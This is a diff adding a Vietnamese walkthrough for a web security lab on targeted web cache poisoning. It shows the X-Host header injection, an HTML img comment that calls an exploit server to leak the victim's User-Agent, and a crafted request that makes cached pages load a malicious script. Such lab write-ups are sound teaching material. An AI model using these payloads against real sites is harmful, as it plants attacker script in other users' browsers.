@@ -54,6 +54,32 @@ Location: https://exploit-0a4f008b03de1df6c0b5f3c5017d0029.exploit-server.net/re
 Khi browser của nạn nhân load file `/resources/js/tracking.js`, thì file tracking.js trong exploit server (thực thi lệnh alert) sẽ được load thay vì file tracking.js của server chứa lỗ hổng. Thực hiện gửi request đến khi response được lưu vào cache. Bài lab được giải thành công.
 
 # 4. Targeted web cache poisoning using an unknown header
+Trong bài lab này, vẫn có chức năng tracking bằng javascript như trước. Tuy nhiên ta không thể exploit bằng cách sử dụng header `X-Forwarded-Host` và `X-Forwarded-Scheme`.
+
+Sử dụng extension "Param Miner" của BurpSuite, ta phát hiện domain name của tracking script có thể bị thay đổi sử dụng header `X-Host`. Thêm header `X-Host: abc.com`, nhận thấy đoạn script trở thành:
+```
+<script type="text/javascript" src="//abc.com/resources/js/tracking.js"></script>
+```
+
+Như vậy ta đã tìm được cách inject mã độc vào response. Trong response có header `Vary: User-Agent`, là cache sẽ được trả về cho user với User-Agent tương ứng. Vậy tiếp theo ta cần xác định User-Agent của victim user.
+
+Trong chức năng comment cho phép comment chứa HTML code. Ta submit comment với nội dung:
+```
+<img src="https://exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net/?data=useragent">
+```
+Vào Access Log của Exploit server, ta lấy được User-Agent của victim:
+```
+03:25:46 +0000 "GET /data=useragent HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
+```
+Vậy, ta cấu hình request với các headers:
+```
+GET / HTTP/1.1
+Host: 0a210087044e5550c155dfef009b007e.h1-web-security-academy.net
+X-Host: exploit-0ac700b8049a5594c1d1de6d011a003c.exploit-server.net
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119
+...
+```
+Submit request đến khi đảm bảo response được lưu vào trong cache. Kết quả, bài lab được giải.
 
 # 5. Web cache poisoning via an unkeyed query string
 
